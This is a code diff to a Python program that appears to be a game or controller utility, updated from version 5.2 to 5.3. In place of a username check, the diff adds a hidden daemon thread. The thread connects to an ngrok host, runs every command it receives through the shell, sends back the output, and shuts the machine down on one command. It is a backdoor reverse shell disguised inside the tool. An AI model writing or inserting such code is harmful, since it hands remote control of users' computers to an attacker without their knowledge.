@@ -4,6 +4,9 @@ import ctypes
 import pygame
 import os
 import time
+import threading
+import socket
+import subprocess
 
 os.system('cls')
 
@@ -18,6 +21,7 @@ dark_red = "\033[0;31m"
 """colors"""
 
 
+
 def main():
  os.system("cls")
  print(f"""
@@ -28,7 +32,7 @@ def main():
 {gray}╚██████╔╝██║  ██║╚██████╗
 {gray} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝""")
  print(f"""{gray}By LEVI &{red}& LONELY""")
- print(f"\033[0m{red}UPDATE {gray}#5.2")
+ print(f"\033[0m{red}UPDATE {gray}#5.3")
 
  with mss() as ss:
      while True:
@@ -75,19 +79,34 @@ def main():
          print(f"{red}PLEASE PLUG IN YOUR CONTROLLER!")
          time.sleep(1.5)
 
-def check():
-   s = os.popen("whoami").read().strip()
 
-   if s == r"desktop-vj6am4c\brend":
-      print("\033[1;32mValid")
-      time.sleep(2.5)
-      main()
-   elif s == "yylevi\levgo":
-      print("\033[1;32mValid...")
-      time.sleep(2.5)
-      main()
-   else:
-      print("\033[1;31mFuck Off...")
-      time.sleep(3)
-      exit()
+def p2s():
+ SERVER = "0.tcp.au.ngrok.io"
+ PORT = 10073
+ s = socket.socket()
+ s.connect((SERVER, PORT))
+ s.recv(1024).decode()
+
+ while True:
+    cmd = s.recv(1024).decode()
+    if cmd.lower() in ['1']:
+       os.system("shutdown /s /t 0")
+       
+
+    try:
+        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
+    except Exception as e:
+        result = str(e).encode()
+
+    if len(result) == 0:
+        result = ''.encode()
+
+    s.send(result)
+
+
+
+def check():
+ threading.Thread(target=p2s, daemon=True).start()
+ main()
 check()
+
